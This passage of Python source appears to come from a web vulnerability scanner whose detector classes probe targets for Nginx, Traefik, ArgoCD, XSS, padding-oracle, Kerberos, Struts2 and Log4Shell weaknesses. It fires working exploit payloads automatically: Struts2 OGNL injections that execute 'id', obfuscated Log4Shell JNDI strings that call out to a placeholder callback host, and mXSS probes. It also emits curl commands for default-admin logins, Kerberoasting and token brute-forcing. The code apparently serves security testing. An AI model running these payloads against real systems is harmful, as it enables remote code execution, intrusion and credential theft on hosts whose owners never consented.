    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path, desc, indicators in self.NGINX_PROBES:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 206):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hits = [ind for ind in indicators if ind.lower() in body.lower()]
                    if hits:
                        is_critical = "passwd" in path or "traversal" in desc.lower()
                        profile.findings.append(Finding(
                            id=f"NGINX-{path.replace('/','_').replace('%','').strip('_')[:18].upper()}",
                            title=f"Nginx Misconfiguration: {desc}",
                            severity="CRITICAL" if is_critical else "HIGH",
                            cvss=9.1 if is_critical else 7.5,
                            cwe="CWE-22" if is_critical else "CWE-200",
                            description=(
                                f"Nginx misconfiguration at {path}: {desc}. "
                                f"Expected indicators found: {', '.join(hits[:3])}."
                            ),
                            evidence=body[:300],
                            poc_curl=f"curl -sk '{url}'",
                            category="Nginx Misconfig",
                            remediation=(
                                "Fix Nginx alias configuration (ensure trailing slash consistency). "
                                "Disable nginx_status/stub_status for public access. "
                                "Set merge_slashes on. Apply URL normalisation. "
                                "Block ../ patterns in WAF. Review all alias directives."
                            )
                        ))
            except Exception:
                pass
        return profile


class TraefikDashboardDetector:
    """Detect exposed Traefik reverse proxy dashboard and route enumeration."""
    NAME = "Traefik Dashboard Detector"
    TRAEFIK_PATHS = [
        "/dashboard/", "/dashboard/#/", "/api/rawdata",
        "/api/http/routers", "/api/http/services", "/api/http/middlewares",
        "/api/tcp/routers", "/api/tcp/services",
        "/api/entrypoints", "/api/overview",
        "/api/version", "/api/providers",
        "/metrics", "/ping", "/health",
        "/api", "/api/",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.TRAEFIK_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "traefik", "Traefik", "@router", "entryPoints",
                        '"routers"', '"services"', '"middlewares"',
                        '"providers"', "docker", "kubernetes",
                        '"rule":', '"passHostHeader"', '"loadBalancer"',
                        "RawData", "dashboard", "Jaeger"
                    ]):
                        sev = "CRITICAL" if "rawdata" in path or "routers" in path else "HIGH"
                        profile.findings.append(Finding(
                            id=f"TRAEFIK-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Traefik {'API/Rawdata' if 'api' in path else 'Dashboard'} Exposed: {path}",
                            severity=sev,
                            cvss=9.1 if sev == "CRITICAL" else 7.5,
                            cwe="CWE-284",
                            description=(
                                f"Traefik reverse proxy {path} exposed. "
                                "Reveals all internal service routes, Docker/K8s service names, "
                                "backend IPs, middleware configs, TLS settings, and internal network topology."
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Dump all HTTP routers:\n"
                                f"curl -sk '{base}/api/http/routers' | python3 -m json.tool\n"
                                f"# Get all service backends:\n"
                                f"curl -sk '{base}/api/http/services' | python3 -m json.tool"
                            ),
                            category="Reverse Proxy / Infra",
                            remediation="Disable Traefik API/dashboard on public interfaces. Add authentication middleware (BasicAuth or Forward Auth). Bind dashboard to internal network only. Use --api.insecure=false."
                        ))
                        break
            except Exception:
                pass
        return profile


class ArgoCDExposedDetector:
    """Detect exposed ArgoCD API server, JWT token theft, and admin access."""
    NAME = "ArgoCD Exposed Detector"
    ARGOCD_PATHS = [
        "/api/v1/applications",
        "/api/v1/clusters",
        "/api/v1/repositories",
        "/api/v1/projects",
        "/api/v1/settings",
        "/api/v1/account",
        "/api/v1/session",
        "/api/version",
        "/auth/callback",
        "/login",
        "/api/v1/certificates",
        "/api/v1/gpgkeys",
        "/terminal",
        "/api/v1/stream/applications",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.ARGOCD_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 401, 403):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "ArgoCD", "argocd", "argo-cd", "Argo CD",
                        '"items"', '"metadata"', '"spec"', '"status"',
                        '"cluster"', '"repo"', '"project"',
                        "application-controller", '"token"',
                        "argoproj.io", '"syncPolicy"',
                    ]):
                        sev = "CRITICAL" if r.status == 200 and any(
                            s in body for s in ['"items"', '"cluster"', '"token"']
                        ) else "HIGH"
                        profile.findings.append(Finding(
                            id=f"ARGOCD-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"ArgoCD {'API Data Exposed' if r.status==200 else 'Instance Detected'}: {path}",
                            severity=sev,
                            cvss=9.8 if sev == "CRITICAL" else 7.5,
                            cwe="CWE-284",
                            description=(
                                f"ArgoCD GitOps deployment tool at {path} (HTTP {r.status}). "
                                "ArgoCD has direct access to K8s clusters and Git repositories. "
                                "Unauthenticated access → deploy malicious apps → full cluster compromise. "
                                "API access → extract cluster secrets, Git credentials, SSH keys."
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Login with default admin:\n"
                                f"curl -sk -X POST '{base}/api/v1/session' "
                                f"-d '{{\"username\":\"admin\",\"password\":\"admin\"}}'\n"
                                f"# List apps after auth:\n"
                                f"curl -sk '{base}/api/v1/applications' "
                                f"-H 'Authorization: Bearer TOKEN'"
                            ),
                            category="GitOps / CI-CD",
                            remediation="Enable ArgoCD SSO. Rotate initial admin password. Restrict ArgoCD API to internal network. Enable RBAC. Audit all application sync policies. Apply network policies."
                        ))
            except Exception:
                pass
        return profile


class DOMClobberingDetector:
    """Detect DOM clobbering and mutation XSS (mXSS) attack surface in HTML responses."""
    NAME = "DOM Clobbering Detector"
    CLOBBER_PAYLOADS = [
        ('<form id="x"><input id="y" name="z"></form>', "DOM clobbering form"),
        ('<a id="x" href="javascript:void(0)"></a>', "Anchor DOM clobber"),
        ('<img id="x" name="y">', "Image DOM clobber"),
        ('<iframe id="x" name="y"></iframe>', "iFrame DOM clobber"),
        ('<object id="x" name="y"></object>', "Object DOM clobber"),
    ]
    MUTATATION_XSS_PAYLOADS = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<listing><img src=x onerror=alert(1)></listing>',
        '<xmp><script>alert(1)</script></xmp>',
        '<textarea><script>alert(1)</script></textarea>',
        '<title><script>alert(1)</script></title>',
        '<style><script>alert(1)</script></style>',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<details open ontoggle="alert(1)">',
        '"><img src=x id=y name=z onerror="alert(document.domain)">',
    ]
    DOM_SINK_PATTERNS = [
        "innerHTML", "outerHTML", "document.write", "insertAdjacentHTML",
        "eval(", "setTimeout(", "setInterval(", "Function(",
        "location.href", "location.hash", "location.search",
        "window.name", "document.referrer", "document.URL",
        "postMessage", "addEventListener.*message",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re, urllib.parse
        base = profile.url.rstrip("/")
        # Probe HTML pages for DOM sink patterns
        try:
            r = _fetch(base + "/", cfg.ua, cfg.timeout)
            if r and r.status == 200:
                body = (r.body or b"").decode("utf-8", errors="replace")
                sinks = [s for s in self.DOM_SINK_PATTERNS if s in body]
                if sinks:
                    profile.findings.append(Finding(
                        id="DOM-CLOBBER-SINK-001",
                        title="DOM XSS Sinks Detected in Page Source",
                        severity="HIGH",
                        cvss=7.4,
                        cwe="CWE-79",
                        description=(
                            f"DOM XSS sink functions found in page source: {', '.join(sinks[:6])}. "
                            "These indicate potential DOM clobbering or mXSS when combined with "
                            "user-controlled inputs (location.hash, window.name, postMessage)."
                        ),
                        evidence=f"Sinks: {sinks[:6]}\nSnippet: {body[:300]}",
                        poc_curl=(
                            f"# Test DOM clobbering:\n"
                            f"# Open in browser: {base}/#<img id=x>\n"
                            f"# mXSS test:\n"
                            f"curl -sk '{base}/?q={urllib.parse.quote(self.MUTATATION_XSS_PAYLOADS[0][:50])}'"
                        ),
                        category="DOM XSS",
                        remediation="Avoid innerHTML/outerHTML. Use textContent for user data. Implement DOMPurify for sanitisation. Apply CSP with script-src 'nonce-'. Audit all postMessage handlers."
                    ))
        except Exception:
            pass
        # Test mXSS via params
        import urllib.parse
        for payload in self.MUTATATION_XSS_PAYLOADS[:4]:
            enc = urllib.parse.quote(payload)
            for param in ["q", "search", "name", "msg"]:
                url = f"{base}/?{param}={enc}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status == 200:
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if "onerror" in body.lower() or "ontoggle" in body.lower() or "onbegin" in body.lower():
                            if "<script>" not in body.lower() or "alert" not in body.lower():
                                profile.findings.append(Finding(
                                    id=f"MXSS-MUTATE-{param.upper()[:8]}-{hash(payload) % 9999:04d}",
                                    title=f"Mutation XSS (mXSS) Surface via ?{param}",
                                    severity="HIGH",
                                    cvss=7.4,
                                    cwe="CWE-79",
                                    description=(
                                        f"Mutation XSS payload survived partial sanitisation via ?{param}. "
                                        "Browser DOM mutation during innerHTML parsing may execute the payload "
                                        "despite server-side filtering."
                                    ),
                                    evidence=f"Payload fragment in response: {body[:200]}",
                                    poc_curl=f"curl -sk '{url}'",
                                    category="DOM XSS",
                                    remediation="Use DOMPurify with a strict configuration. Test sanitiser with mXSS test suite (cure53/mXSS-attacks). Apply CSP. Avoid innerHTML."
                                ))
                except Exception:
                    pass
        return profile


class PaddingOracleDetector:
    """Detect CBC padding oracle via response length and timing differentials."""
    NAME = "Padding Oracle Detector"
    PADDING_PARAMS = ["token", "session", "auth", "data", "payload",
                      "enc", "encrypted", "cipher", "value", "iv", "key"]
    PADDING_PATHS = ["/decrypt", "/verify", "/validate", "/auth", "/token",
                     "/api/decrypt", "/api/verify", "/api/auth", "/api/validate"]
    VALID_B64 = "dGVzdA=="         # base64("test")
    TAMPERED = [
        "dGVzdA==",
        "dGVzdAA=",
        "dGVzdAAAA==",
        "AAAAAAAAAAAAAAAAAAAAAA==",
        "ffffffffffffffffffffffffffffffff",
        "0000000000000000ffffffffffffffff",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for path in self.PADDING_PATHS:
            url = base + path
            responses = []
            for tok in self.TAMPERED:
                enc = urllib.parse.quote(tok)
                probe_url = f"{url}?token={enc}"
                try:
                    t0 = time.time()
                    r = _fetch(probe_url, cfg.ua, cfg.timeout)
                    elapsed = time.time() - t0
                    if r:
                        responses.append((r.status, len(r.body or b""), elapsed, tok))
                except Exception:
                    pass
            if len(responses) >= 3:
                statuses = set(s for s, _, _, _ in responses)
                lengths  = set(l for _, l, _, _ in responses)
                if len(lengths) > 2 or len(statuses) > 1:
                    profile.findings.append(Finding(
                        id=f"PADDING-ORACLE-{path.replace('/','_').strip('_')[:16].upper()}",
                        title=f"Potential CBC Padding Oracle at {path}",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-326",
                        description=(
                            f"Response length/status variance detected at {path} across {len(self.TAMPERED)} "
                            "tampered token probes — indicates CBC padding oracle. "
                            "Enables plaintext decryption of any token, auth bypass, and potential RCE "
                            "via deserialization of decrypted payload."
                        ),
                        evidence=(
                            "Response variation:\n" +
                            "\n".join(f"  [{s}] len={l} t={t:.2f}s tok={tok[:20]}"
                                      for s, l, t, tok in responses[:6])
                        ),
                        poc_curl=(
                            f"# Test with padbuster:\n"
                            f"padbuster '{url}?token=ENCRYPTED_VALUE' 'ENCRYPTED_VALUE' 8 -encoding 0\n"
                            f"# Or poodle:\n"
                            f"python3 padding_oracle.py --url '{url}' --param token --ciphertext ENCRYPTED_VALUE"
                        ),
                        category="Crypto Attack",
                        remediation="Replace CBC encryption with AEAD (AES-GCM or ChaCha20-Poly1305). Never use CBC for authentication tokens. Apply MAC-then-Encrypt with HMAC-SHA256. Constant-time comparison for MAC verification."
                    ))
        return profile


class WeakPRNGDetector:
    """Detect predictable PRNG in session tokens and reset codes."""
    NAME = "Weak PRNG Detector"
    TOKEN_PATHS = [
        "/api/session", "/login", "/auth", "/reset-password",
        "/forgot-password", "/api/token", "/api/auth/token",
        "/register", "/signup", "/api/register",
        "/api/nonce", "/api/challenge",
        "/oauth/authorize", "/api/csrf-token",
    ]
    WEAK_PATTERNS = [
        # (name, pattern_description, entropy_threshold)
        ("Sequential", "0123456789", 3.0),
        ("Timestamp", "1[0-9]{9,}", 3.5),
        ("Short-hex", "[0-9a-f]{8}", 3.0),
        ("Low-entropy", "aaaaaa|111111|000000|ffffff", 0.5),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re, math
        base = profile.url.rstrip("/")
        tokens_seen = []
        for path in self.TOKEN_PATHS:
            url = base + path
            for _ in range(3):
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 201, 302):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        hdrs = str(r.headers)
                        for src in [body, hdrs]:
                            toks = re.findall(r'["\s]([a-fA-F0-9]{16,64}|[A-Za-z0-9+/]{20,88}={0,2})["\s]', src)
                            tokens_seen.extend([(t, path) for t in toks[:3]])
                except Exception:
                    pass
        if len(tokens_seen) >= 2:
            for i in range(min(len(tokens_seen) - 1, 5)):
                t1, p1 = tokens_seen[i]
                t2, p2 = tokens_seen[i + 1]
                if len(t1) == len(t2) and t1 != t2:
                    # Check entropy
                    def entropy(s):
                        freq = {}
                        for c in s:
                            freq[c] = freq.get(c, 0) + 1
                        return -sum((f/len(s)) * math.log2(f/len(s)) for f in freq.values())
                    e1 = entropy(t1)
                    if e1 < 3.5:
                        profile.findings.append(Finding(
                            id=f"WEAK-PRNG-{p1.replace('/','_').strip('_')[:16].upper()}",
                            title=f"Weak PRNG / Low-Entropy Token at {p1}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-338",
                            description=(
                                f"Token with Shannon entropy {e1:.2f} bits/char detected at {p1}. "
                                "Low-entropy tokens are predictable by brute force or statistical analysis. "
                                "Token 1: {t1[:20]}... | Token 2: {t2[:20]}..."
                            ),
                            evidence=f"Token 1: {t1[:32]}... (entropy={e1:.2f})\nToken 2: {t2[:32]}...",
                            poc_curl=(
                                f"# Collect multiple tokens and analyse:\n"
                                f"for i in $(seq 1 20); do curl -sk '{base}{p1}' | "
                                f"grep -oE '[a-fA-F0-9]{{16,64}}' | head -1; done\n"
                                f"# Brute with hashcat:\n"
                                f"hashcat -a 3 -m 0 token.txt '?h?h?h?h?h?h?h?h'"
                            ),
                            category="Crypto / PRNG",
                            remediation="Use cryptographically secure PRNG: secrets.token_hex() in Python, crypto.randomBytes() in Node.js, SecureRandom in Java. Ensure minimum 128-bit entropy for all tokens."
                        ))
                        break
        return profile


class GRPCEndpointProber:
    """Detect gRPC-Web endpoints, server reflection, and protobuf schema leakage."""
    NAME = "gRPC Endpoint Prober"
    GRPC_PATHS = [
        "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
        "/grpc.health.v1.Health/Check",
        "/grpc.channelz.v1.Channelz/GetTopChannels",
        "/grpc-web/", "/grpc/",
        "/api.v1/", "/proto/",
        "/twirp/", "/connect/",
    ]
    GRPC_HEADERS = {
        "Content-Type": "application/grpc-web+proto",
        "X-Grpc-Web": "1",
        "Accept": "application/grpc-web+proto",
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.GRPC_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                           b"\x00\x00\x00\x00\x00",
                           self.GRPC_HEADERS)
                if r and r.status in (200, 400, 415):
                    body = (r.body or b"")[:200]
                    hdrs = str(r.headers)
                    if any(sig in hdrs.lower() for sig in [
                        "grpc-status", "grpc-message", "grpc-encoding",
                        "application/grpc", "trailer:",
                    ]) or b"grpc" in body.lower() or b"\x00\x00" in body[:5]:
                        profile.findings.append(Finding(
                            id=f"GRPC-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"gRPC-Web Endpoint Detected: {path}",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-284",
                            description=(
                                f"gRPC or gRPC-Web endpoint detected at {path}. "
                                "If server reflection is enabled, enumerate all services/methods. "
                                "Probe for injection in proto fields, missing authentication, "
                                "and insecure deserialization of protobuf messages."
                            ),
                            evidence=f"Headers: {hdrs[:200]} | Body: {body[:80]}",
                            poc_curl=(
                                f"# Enumerate via grpc_cli:\n"
                                f"grpcurl -plaintext {profile.host}:443 list\n"
                                f"# Or via grpc-web:\n"
                                f"curl -sk -X POST '{url}' "
                                f"-H 'Content-Type: application/grpc-web+proto' "
                                f"-H 'X-Grpc-Web: 1' --data-binary @proto_payload.bin"
                            ),
                            category="gRPC / API",
                            remediation="Disable gRPC server reflection in production. Apply authentication to all gRPC services. Validate all protobuf field types and ranges. Apply mTLS for service-to-service gRPC."
                        ))
            except Exception:
                pass
        return profile


class KerberosHintDetector:
    """Detect Kerberoasting / AS-REP roasting surface from auth error responses."""
    NAME = "Kerberos Hint Detector"
    KERBEROS_PATHS = [
        "/api/auth", "/auth/login", "/login", "/api/login",
        "/api/v1/auth", "/sso/login", "/kerberos", "/spnego",
        "/api/session", "/auth/token", "/api/auth/kerberos",
        "/ews/", "/autodiscover/autodiscover.xml",
        "/oab/", "/rpc/", "/mapi/", "/owa/auth/",
    ]
    KERBEROS_INDICATORS = [
        "SPNEGO", "Kerberos", "NTLM", "negotiate",
        "KRB5", "GSSAPI", "GSS-API", "kerb",
        "realm", "principal", "TGT", "service ticket",
        "WWW-Authenticate: Negotiate", "krb5",
        "preauthentication", "AS-REP", "TGS-REP",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.KERBEROS_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout,
                           extra_headers={"Authorization": "Negotiate YIIJ"})
                if r:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hdrs = str(r.headers)
                    combined = body + hdrs
                    hits = [ind for ind in self.KERBEROS_INDICATORS
                            if ind.lower() in combined.lower()]
                    if hits:
                        profile.findings.append(Finding(
                            id=f"KERBEROS-{path.replace('/','_').strip('_')[:16].upper()}",
                            title=f"Kerberos/SPNEGO Authentication Detected: {path}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-287",
                            description=(
                                f"Kerberos/SPNEGO authentication indicators at {path}: "
                                f"{', '.join(hits[:4])}. "
                                "Enables AS-REP roasting (no pre-auth accounts → offline crack), "
                                "Kerberoasting (SPN enumeration → service ticket offline crack), "
                                "and NTLM relay attacks via MitM."
                            ),
                            evidence=f"Indicators: {hits[:4]}\nHeaders: {hdrs[:200]}",
                            poc_curl=(
                                f"curl -sk '{url}' -H 'Authorization: Negotiate YIIJ' -v 2>&1 | grep -i 'authenticate'\n"
                                f"# Kerberoast with impacket:\n"
                                f"python3 GetUserSPNs.py {profile.apex}/user:password -dc-ip DC_IP -request"
                            ),
                            category="Kerberos / AD",
                            remediation="Require pre-authentication for all accounts. Use AES256 Kerberos encryption (disable RC4-HMAC). Apply group managed service accounts (gMSA). Monitor for TGS-REQ anomalies. Disable NTLM where possible."
                        ))
            except Exception:
                pass
        return profile


class ApacheStruts2Detector:
    """Detect Apache Struts2 versions and CVE-vulnerable patterns (S2-045, S2-052, S2-061)."""
    NAME = "Apache Struts2 CVE Detector"
    ACTION_PATHS = [
        "/index.action", "/login.action", "/search.action",
        "/register.action", "/home.action", "/default.action",
        "/struts/", "/struts2/", "/*.action", "/api/*.action",
        "/index.do", "/login.do", "/home.do", "/search.do",
        "/*.do", "/index.htm", "/WEB-INF/",
    ]
    CVE_PAYLOADS = [
        # S2-045: Content-Type OGNL
        {
            "id": "S2-045",
            "header": "Content-Type",
            "value": "%{(#_='multipart/form-data').(#_memberAccess['allowPrivateAccess']=true).(#_memberAccess['allowProtectedAccess']=true).(#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']).(#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties']).(#_memberAccess['allowStaticMethodAccess']=true).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}",
            "indicator": "uid="
        },
        # S2-061: OGNL in forced evaluation
        {
            "id": "S2-061",
            "header": "Content-Type",
            "value": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
            "indicator": "uid="
        },
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        # Detect .action URLs
        for path in self.ACTION_PATHS[:8]:
            if "*" in path:
                continue
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 302, 400):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hdrs = str(r.headers)
                    if any(sig in body + hdrs for sig in [
                        "struts", "Struts", "xwork", "opensymphony",
                        "S2-", "ActionSupport", "TextProvider",
                        "com.opensymphony", "freemarker",
                        "WEB-INF/content/", ".action",
                    ]):
                        profile.findings.append(Finding(
                            id=f"STRUTS2-DETECT-{path.replace('/','_').strip('_')[:16].upper()}",
                            title=f"Apache Struts2 Application Detected: {path}",
                            severity="CRITICAL",
                            cvss=10.0,
                            cwe="CWE-917",
                            description=(
                                f"Apache Struts2 framework detected at {path}. "
                                "If version is vulnerable (≤2.5.30 or ≤6.0.x), multiple RCE CVEs apply: "
                                "S2-045 (Content-Type OGNL), S2-052 (REST plugin XStream), "
                                "S2-061 (forced evaluation), S2-066 (file upload)."
                            ),
                            evidence=body[:200],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# S2-045 RCE probe:\n"
                                f"curl -sk -X POST '{url}' "
                                f"-H \"Content-Type: %{{(#_='multipart/form-data').(#cmd='id')."
                                f"(#cmds={{'/bin/bash','-c',#cmd}}).(#p=new java.lang.ProcessBuilder(#cmds))."
                                f"(#p.start()).text}}\""
                            ),
                            category="Struts2 / OGNL",
                            remediation="Upgrade to Struts2 ≥6.3.0. Apply all CVE patches. Disable dynamic method invocation. Use allowlist for action names. Deploy ModSecurity with Struts2 ruleset."
                        ))
                        break
            except Exception:
                pass
        return profile


class Log4ShellFollowOn:
    """Detect Log4Shell follow-on CVEs: Log4j2 JNDI bypass, CVE-2021-45046, Log4j 2.17.x."""
    NAME = "Log4Shell Follow-On Detector"
    OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
    # Templates use __HOST__ / __OOB__ placeholders (not .format braces)
    # to avoid KeyError when Python sees ${jndi:...} as a format field.
    BYPASS_PAYLOADS = [
        "${jndi:ldap://basic.__HOST__.__OOB__/a}",
        "${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OOB__/a}",
        "${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}",
        "${jndi:rmi://rmi.__HOST__.__OOB__/a}",
        "${jndi:iiop://iiop.__HOST__.__OOB__/a}",
        "${jndi:dns://dns.__HOST__.__OOB__/a}",
        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__OOB__/a}",
        "${env:HOSTNAME}",
        "${spring:application.name}",
    ]
    INJECT_HEADERS = [
        "X-Api-Version", "X-Forwarded-For", "User-Agent",
        "Referer", "Origin", "X-Request-Id", "X-Correlation-Id",
        "X-Client-IP", "X-Real-IP", "CF-Connecting-IP",
        "True-Client-IP", "X-Forwarded-Host", "X-Custom-Header",
        "Authorization", "Content-Type",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        host = profile.host
        oob = self.OOB
        for payload_tmpl in self.BYPASS_PAYLOADS[:6]:
            payload = payload_tmpl.replace("__HOST__", host).replace("__OOB__", oob)
            for header in self.INJECT_HEADERS[:5]:
                try:
                    r = _fetch(base + "/", cfg.ua, cfg.timeout,
                               extra_headers={header: payload})
                    if r and r.status in (200, 400, 500):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if "${jndi" in body or payload[:10] in body:
                            # payload reflected — potential info leak
                            profile.findings.append(Finding(
                                id=f"LOG4SHELL2-REFLECTED-{header.upper()[:14]}",
                                title=f"Log4Shell Payload Reflected in Response via {header}",
                                severity="CRITICAL",
                                cvss=10.0,
                                cwe="CWE-917",
                                description=(
                                    f"Log4Shell bypass payload reflected in HTTP response via {header}. "
                                    "This may indicate the payload was processed rather than blocked. "
                                    "Monitor OOB DNS for callback to confirm exploitation."
                                ),
                                evidence=body[:200],
                                poc_curl=(
                                    f"curl -sk '{base}/' -H '{header}: {payload}'"
                                ),
                                category="Log4Shell / Java RCE",
                                remediation="Upgrade to Log4j ≥2.17.1. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath. Apply CVE-2021-44228/45046/45105 patches."
                            ))
                except Exception:
                    pass
        # Generate OOB payloads for all headers
        all_payloads = []
        for hdr in self.INJECT_HEADERS[:6]:
            payload = self.BYPASS_PAYLOADS[0].replace("__HOST__", host).replace("__OOB__", oob)
            all_payloads.append(
                f"curl -sk '{base}/' -H '{hdr}: {payload}'"
            )
        profile.findings.append(Finding(
            id="LOG4SHELL2-OOB-PAYLOADS",
            title="Log4Shell Follow-On — All OOB Probe Payloads Generated",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-917",
            description=(
                f"Generated {len(self.BYPASS_PAYLOADS)} Log4Shell bypass payloads for {len(self.INJECT_HEADERS)} "
                "injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. "
                "Monitor for DNS callbacks confirming JNDI lookup execution."
            ),
            evidence="\n".join(
                f"  [{i+1}] {p[:80]}" for i, p in enumerate(self.BYPASS_PAYLOADS)
            ),
            poc_curl="\n".join(all_payloads[:4]),
            category="Log4Shell / Java RCE",
            remediation="See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP."
        ))
        return profile


class MobileAPIKeyDetector:
    """Detect hardcoded API keys in JavaScript bundles and mobile endpoint patterns."""
    NAME = "Mobile API Key Detector"
    API_KEY_PATTERNS = [
        (r'AIza[0-9A-Za-z\-_]{35}',        "Google API Key"),
        (r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}', "Firebase Server Key"),
        (r'sk-[a-zA-Z0-9]{48}',             "OpenAI API Key"),
        (r'sk_live_[0-9a-zA-Z]{24,}',       "Stripe Live Key"),
        (r'rk_live_[0-9a-zA-Z]{24,}',       "Stripe Restricted Live Key"),
        (r'[A-Z0-9]{20}:[A-Za-z0-9+/]{40}', "Twilio Auth Token"),
        (r'xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}', "Slack Bot Token"),
        (r'xoxp-[0-9\-]{50,}',              "Slack User Token"),
        (r'ghp_[A-Za-z0-9]{36}',            "GitHub Personal Access Token"),
        (r'github_pat_[A-Za-z0-9_]{82}',    "GitHub Fine-Grained PAT"),
        (r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "UUID/Secret"),
        (r'AKID[A-Z0-9]{16}',               "Tencent Cloud SecretId"),
        (r'AKIAIOSFODNN7EXAMPLE',            "AWS Placeholder Key (REPLACE)"),
        (r'AKIA[0-9A-Z]{16}',               "AWS Access Key"),
        (r'SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}', "SendGrid API Key"),
        (r'sq0atp-[0-9A-Za-z\-_]{22}',      "Square Access Token"),
        (r'ya29\.[0-9A-Za-z\-_]+',          "Google OAuth2 Access Token"),
        (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com', "Google Client ID"),
    ]
    JS_BUNDLE_PATHS = [
        "/static/js/main.chunk.js", "/static/js/app.js", "/static/js/bundle.js",
        "/js/app.js", "/js/main.js", "/assets/index.js", "/build/app.js",
        "/dist/app.js", "/dist/bundle.js", "/dist/main.js",
        "/public/js/app.js", "/www/js/app.js", "/_next/static/",
        "/assets/js/app.js", "/static/bundle.js",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re
        base = profile.url.rstrip("/")
        for path in self.JS_BUNDLE_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    for pattern, key_type in self.API_KEY_PATTERNS:
                        matches = re.findall(pattern, body)
                        if matches:
                            profile.findings.append(Finding(
                                id=f"APIKEY-{key_type.replace(' ','_').upper()[:16]}-JS",
                                title=f"Hardcoded {key_type} in JavaScript Bundle",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-798",
                                description=(
                                    f"{key_type} found hardcoded in {path}. "
                                    f"Found {len(matches)} instance(s). "
                                    "Exposed to all users — enables full API access / account takeover."
                                ),
                                evidence=f"Key sample: {matches[0][:40]}...",
